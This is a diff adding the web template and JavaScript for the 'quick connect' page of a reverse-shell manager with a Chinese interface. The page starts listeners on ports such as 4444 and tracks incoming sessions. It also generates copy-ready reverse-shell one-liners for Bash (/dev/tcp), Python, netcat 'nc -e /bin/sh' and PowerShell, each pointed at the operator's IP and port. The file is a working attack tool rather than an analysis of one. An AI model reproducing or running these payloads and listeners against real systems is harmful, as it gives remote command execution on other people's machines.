@@ -1,0 +1,474 @@
+{% extends "base.html" %}
+
+{% block title %}快速连接 - Shell Manager{% endblock %}
+
+{% block active_page %}quickconnect{% endblock %}
+
+{% block page_title %}快速连接{% endblock %}
+
+{% block content %}
+<!-- 快速监听 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title" style="display:flex;align-items:center;gap:10px;"><span class="icon icon-rocket" aria-hidden="true"></span> 快速启动监听</h3>
+            <p class="card-subtitle">一键启动监听器，等待目标连接</p>
+        </div>
+    </div>
+    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px;">
+        <div class="stat-card quick-stat-card" role="button" tabindex="0" onclick="quickListen(4444)" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();quickListen(4444);}">
+            <div class="stat-icon blue"><span class="icon icon-plug" aria-hidden="true"></span></div>
+            <div class="stat-content">
+                <div class="stat-value">4444</div>
+                <div class="stat-label">Metasploit默认</div>
+            </div>
+        </div>
+        <div class="stat-card quick-stat-card" role="button" tabindex="0" onclick="quickListen(5555)" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();quickListen(5555);}">
+            <div class="stat-icon green"><span class="icon icon-plug" aria-hidden="true"></span></div>
+            <div class="stat-content">
+                <div class="stat-value">5555</div>
+                <div class="stat-label">Android调试</div>
+            </div>
+        </div>
+        <div class="stat-card quick-stat-card" role="button" tabindex="0" onclick="quickListen(6666)" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();quickListen(6666);}">
+            <div class="stat-icon orange"><span class="icon icon-plug" aria-hidden="true"></span></div>
+            <div class="stat-content">
+                <div class="stat-value">6666</div>
+                <div class="stat-label">常用端口</div>
+            </div>
+        </div>
+        <div class="stat-card quick-stat-card" role="button" tabindex="0" onclick="quickListen(7777)" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();quickListen(7777);}">
+            <div class="stat-icon purple"><span class="icon icon-plug" aria-hidden="true"></span></div>
+            <div class="stat-content">
+                <div class="stat-value">7777</div>
+                <div class="stat-label">常用端口</div>
+            </div>
+        </div>
+    </div>
+    
+    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border-subtle);">
+        <div style="display: flex; gap: 12px; align-items: flex-end;">
+            <div class="input-group" style="flex: 1; margin-bottom: 0;">
+                <label class="input-label">自定义端口</label>
+                <input type="number" class="input" id="custom-port" placeholder="输入端口号" min="1" max="65535">
+            </div>
+            <button type="button" class="btn btn-success" onclick="startCustomListener()">
+                <span class="icon icon-play" aria-hidden="true"></span> 启动监听
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- 批量监听 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title" style="display:flex;align-items:center;gap:10px;"><span class="icon icon-package" aria-hidden="true"></span> 批量监听</h3>
+            <p class="card-subtitle">同时在多个端口启动监听</p>
+        </div>
+    </div>
+    <div class="input-group">
+        <label class="input-label">端口列表（每行一个端口或使用范围如 4444-4449）</label>
+        <textarea class="input" id="batch-ports" rows="4" placeholder="4444&#10;4445&#10;5555&#10;或: 4444-4449" style="resize: vertical; font-family: monospace;"></textarea>
+    </div>
+    <div style="display: flex; gap: 12px;">
+        <button type="button" class="btn btn-primary" onclick="startBatchListeners()">
+            <span class="icon icon-play" aria-hidden="true"></span> 批量启动
+        </button>
+        <button type="button" class="btn btn-danger" onclick="stopAllListeners()">
+            <span class="icon icon-stop" aria-hidden="true"></span> 停止全部
+        </button>
+    </div>
+</div>
+
+<!-- 当前监听状态 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title" style="display:flex;align-items:center;gap:10px;"><span class="icon icon-signal" aria-hidden="true"></span> 当前监听状态</h3>
+            <p class="card-subtitle">所有活跃的监听器和连接</p>
+        </div>
+        <button type="button" class="btn btn-ghost btn-sm" onclick="refreshListeners()" aria-label="刷新监听状态">
+            <span class="icon icon-refresh" aria-hidden="true"></span> 刷新
+        </button>
+    </div>
+    <div id="listeners-status">
+        <div class="empty-state">
+            <div class="empty-state-icon"><span class="icon icon-moon" aria-hidden="true"></span></div>
+            <div class="empty-state-title">暂无活跃监听器</div>
+            <div class="empty-state-desc">点击上方端口卡片或自定义端口启动监听</div>
+        </div>
+    </div>
+</div>
+
+<!-- 快速载荷复制 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title" style="display:flex;align-items:center;gap:10px;"><span class="icon icon-clipboard" aria-hidden="true"></span> 快速载荷复制</h3>
+            <p class="card-subtitle">点击复制对应端口的常用载荷</p>
+        </div>
+    </div>
+    <div class="input-group">
+        <label class="input-label">本机IP地址</label>
+        <div style="display: flex; gap: 12px;">
+            <input type="text" class="input" id="local-ip" placeholder="输入本机IP或点击获取" style="flex: 1;">
+            <button type="button" class="btn btn-secondary" onclick="detectLocalIP()" aria-label="自动检测本机 IP">
+                <span class="icon icon-search" aria-hidden="true"></span> 自动检测
+            </button>
+        </div>
+    </div>
+    <div id="quick-payloads" style="margin-top: 16px; display: none;">
+        <div style="margin-bottom: 12px; color: var(--text-secondary);">常用载荷（点击复制）：</div>
+        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;">
+            <div class="code-block" style="cursor: pointer;" onclick="copyQuickPayload('bash')">
+                <div class="code-block-header">
+                    <span class="code-block-title">Bash</span>
+                </div>
+                <pre id="quick-bash" style="font-size: 11px;"></pre>
+            </div>
+            <div class="code-block" style="cursor: pointer;" onclick="copyQuickPayload('python')">
+                <div class="code-block-header">
+                    <span class="code-block-title">Python</span>
+                </div>
+                <pre id="quick-python" style="font-size: 11px;"></pre>
+            </div>
+            <div class="code-block" style="cursor: pointer;" onclick="copyQuickPayload('nc')">
+                <div class="code-block-header">
+                    <span class="code-block-title">Netcat</span>
+                </div>
+                <pre id="quick-nc" style="font-size: 11px;"></pre>
+            </div>
+            <div class="code-block" style="cursor: pointer;" onclick="copyQuickPayload('powershell')">
+                <div class="code-block-header">
+                    <span class="code-block-title">PowerShell</span>
+                </div>
+                <pre id="quick-powershell" style="font-size: 10px;"></pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 连接历史 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title" style="display:flex;align-items:center;gap:10px;"><span class="icon icon-history" aria-hidden="true"></span> 连接历史</h3>
+            <p class="card-subtitle">最近的连接记录</p>
+        </div>
+        <button type="button" class="btn btn-ghost btn-sm" onclick="clearHistory()" aria-label="清空连接历史">
+            <span class="icon icon-trash" aria-hidden="true"></span> 清空
+        </button>
+    </div>
+    <div id="connection-history">
+        <div class="empty-state">
+            <div class="empty-state-icon"><span class="icon icon-inbox" aria-hidden="true"></span></div>
+            <div class="empty-state-title">暂无连接记录</div>
+        </div>
+    </div>
+</div>
+
+<!-- 自动重连设置 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title" style="display:flex;align-items:center;gap:10px;"><span class="icon icon-rotate" aria-hidden="true"></span> 自动重连</h3>
+            <p class="card-subtitle">设置断线后自动重连行为</p>
+        </div>
+    </div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+        <div class="input-group">
+            <label class="input-label">重连间隔（秒）</label>
+            <input type="number" class="input" id="reconnect-interval" value="5" min="1" max="60">
+        </div>
+        <div class="input-group">
+            <label class="input-label">最大重试次数</label>
+            <input type="number" class="input" id="max-retries" value="10" min="1" max="100">
+        </div>
+    </div>
+    <div style="margin-top: 16px;">
+        <label style="display: flex; align-items: center; gap: 8px; cursor: pointer;">
+            <input type="checkbox" id="auto-reconnect" style="width: 18px; height: 18px;">
+            <span style="color: var(--text-secondary);">启用监听器自动重启</span>
+        </label>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let listeners = [];
+    let connectionHistory = [];
+
+    // 快速监听
+    function quickListen(port) {
+        socket.emit('start_listener', { port: port });
+    }
+
+    // 自定义端口监听
+    function startCustomListener() {
+        const port = parseInt(document.getElementById('custom-port').value);
+        if (!port || port < 1 || port > 65535) {
+            showToast('请输入有效的端口号', 'error');
+            return;
+        }
+        socket.emit('start_listener', { port: port });
+    }
+
+    // 批量监听
+    function startBatchListeners() {
+        const input = document.getElementById('batch-ports').value;
+        const ports = [];
+        
+        // 解析输入
+        const lines = input.split('\n').map(l => l.trim()).filter(l => l);
+        lines.forEach(line => {
+            if (line.includes('-')) {
+                // 范围格式
+                const [start, end] = line.split('-').map(n => parseInt(n.trim()));
+                if (start && end && start <= end) {
+                    for (let i = start; i <= end && ports.length < 20; i++) {
+                        if (i >= 1 && i <= 65535) {
+                            ports.push(i);
+                        }
+                    }
+                }
+            } else {
+                // 单端口
+                const port = parseInt(line);
+                if (port >= 1 && port <= 65535) {
+                    ports.push(port);
+                }
+            }
+        });
+
+        if (ports.length === 0) {
+            showToast('请输入有效的端口号', 'error');
+            return;
+        }
+
+        if (ports.length > 20) {
+            showToast('最多同时监听20个端口', 'warning');
+            return;
+        }
+
+        // 批量启动
+        let successCount = 0;
+        ports.forEach((port, index) => {
+            setTimeout(() => {
+                socket.emit('start_listener', { port: port });
+            }, index * 200);
+        });
+
+        showToast(`正在启动 ${ports.length} 个监听器...`, 'info');
+    }
+
+    // 停止所有监听器
+    async function stopAllListeners() {
+        if (!confirm('确定要停止所有监听器吗？')) return;
+        
+        listeners.forEach(l => {
+            socket.emit('stop_listener', { port: l.port });
+        });
+        
+        showToast('正在停止所有监听器...', 'info');
+    }
+
+    // 刷新监听器状态
+    async function refreshListeners() {
+        try {
+            const data = await api('/api/listeners');
+            listeners = data.listeners;
+            renderListeners();
+        } catch (e) {
+            showToast('刷新失败', 'error');
+        }
+    }
+
+    // 渲染监听器列表
+    function renderListeners() {
+        const container = document.getElementById('listeners-status');
+        
+        if (listeners.length === 0) {
+            container.innerHTML = `
+                <div class="empty-state">
+                    <div class="empty-state-icon"><span class="icon icon-moon" aria-hidden="true"></span></div>
+                    <div class="empty-state-title">暂无活跃监听器</div>
+                    <div class="empty-state-desc">点击上方端口卡片或自定义端口启动监听</div>
+                </div>
+            `;
+            return;
+        }
+
+        container.innerHTML = listeners.map(l => `
+            <div style="display: flex; align-items: center; justify-content: space-between; padding: 16px; background: var(--bg-deep); border-radius: 8px; border: 1px solid var(--border-subtle); margin-bottom: 12px;">
+                <div style="display: flex; align-items: center; gap: 16px;">
+                    <div style="width: 12px; height: 12px; border-radius: 50%; background: var(--color-success); animation: pulse 2s infinite;"></div>
+                    <div>
+                        <div style="font-weight: 600; color: var(--text-primary);">端口 ${l.port}</div>
+                        <div style="font-size: 12px; color: var(--text-tertiary);">创建于 ${formatTime(l.created_at)}</div>
+                    </div>
+                    <span class="status-badge online">
+                        <span class="status-dot"></span>
+                        ${l.session_count} 个连接
+                    </span>
+                </div>
+                <div style="display: flex; gap: 8px;">
+                    <button type="button" class="btn btn-ghost btn-sm" onclick="copyPayloadForPort(${l.port})" aria-label="复制端口 ${l.port} 载荷">
+                        <span class="icon icon-clipboard" aria-hidden="true"></span> 复制载荷
+                    </button>
+                    <button class="btn btn-danger btn-sm" onclick="stopListener(${l.port})">
+                        停止
+                    </button>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    // 停止监听器
+    function stopListener(port) {
+        socket.emit('stop_listener', { port: port });
+    }
+
+    // 复制端口载荷
+    function copyPayloadForPort(port) {
+        const ip = document.getElementById('local-ip').value || 'YOUR_IP';
+        const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+        copyToClipboard(payload);
+    }
+
+    // 检测本机IP
+    function detectLocalIP() {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        
+        pc.onicecandidate = (ice) => {
+            if (ice && ice.candidate && ice.candidate.candidate) {
+                const ip = ice.candidate.candidate.split(' ')[4];
+                if (ip && ip.match(/\d+\.\d+\.\d+\.\d+/)) {
+                    document.getElementById('local-ip').value = ip;
+                    updateQuickPayloads();
+                    showToast(`检测到IP: ${ip}`, 'success');
+                    pc.close();
+                }
+            }
+        };
+        
+        setTimeout(() => {
+            if (!document.getElementById('local-ip').value) {
+                showToast('无法自动检测，请手动输入', 'warning');
+            }
+        }, 3000);
+    }
+
+    // 更新快速载荷
+    function updateQuickPayloads() {
+        const ip = document.getElementById('local-ip').value;
+        if (!ip) return;
+
+        const port = listeners.length > 0 ? listeners[0].port : 4444;
+
+        document.getElementById('quick-payloads').style.display = 'block';
+        document.getElementById('quick-bash').textContent = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+        document.getElementById('quick-python').textContent = `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+        document.getElementById('quick-nc').textContent = `nc -e /bin/sh ${ip} ${port}`;
+        document.getElementById('quick-powershell').textContent = `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+=\"PS \"+(pwd).Path+\"> \";$e=[text.encoding]::ASCII.GetBytes($r);$s.Write($e,0,$e.Length)};$c.Close()"`;
+    }
+
+    // 复制快速载荷
+    function copyQuickPayload(type) {
+        const element = document.getElementById(`quick-${type}`);
+        if (element) {
+            copyToClipboard(element.textContent);
+        }
+    }
+
+    // 清空历史
+    function clearHistory() {
+        connectionHistory = [];
+        renderHistory();
+        showToast('历史已清空', 'info');
+    }
+
+    // 渲染历史
+    function renderHistory() {
+        const container = document.getElementById('connection-history');
+        if (connectionHistory.length === 0) {
+            container.innerHTML = `
+                <div class="empty-state">
+                    <div class="empty-state-icon"><span class="icon icon-inbox" aria-hidden="true"></span></div>
+                    <div class="empty-state-title">暂无连接记录</div>
+                </div>
+            `;
+            return;
+        }
+
+        container.innerHTML = `
+            <div class="table-container">
+                <table class="table">
+                    <thead>
+                        <tr>
+                            <th>地址</th>
+                            <th>端口</th>
+                            <th>连接时间</th>
+                            <th>状态</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${connectionHistory.map(h => `
+                            <tr>
+                                <td style="font-family: monospace;">${h.address}</td>
+                                <td>${h.port}</td>
+                                <td>${formatTime(h.time)}</td>
+                                <td><span class="status-badge ${h.connected ? 'online' : 'offline'}">${h.connected ? '已连接' : '已断开'}</span></td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            </div>
+        `;
+    }
+
+    // 监听事件
+    document.addEventListener('listener_started', (e) => {
+        refreshListeners();
+    });
+
+    document.addEventListener('listener_stopped', (e) => {
+        refreshListeners();
+    });
+
+    document.addEventListener('new_session', (e) => {
+        const session = e.detail;
+        connectionHistory.unshift({
+            address: session.address,
+            port: session.port,
+            time: new Date().toISOString(),
+            connected: true
+        });
+        renderHistory();
+        updateQuickPayloads();
+    });
+
+    document.addEventListener('session_disconnected', (e) => {
+        renderHistory();
+    });
+
+    // IP输入变化时更新载荷
+    document.getElementById('local-ip').addEventListener('input', updateQuickPayloads);
+
+    // 添加CSS动画
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    `;
+    document.head.appendChild(style);
+
+    // 初始化
+    refreshListeners();
+</script>
+{% endblock %}
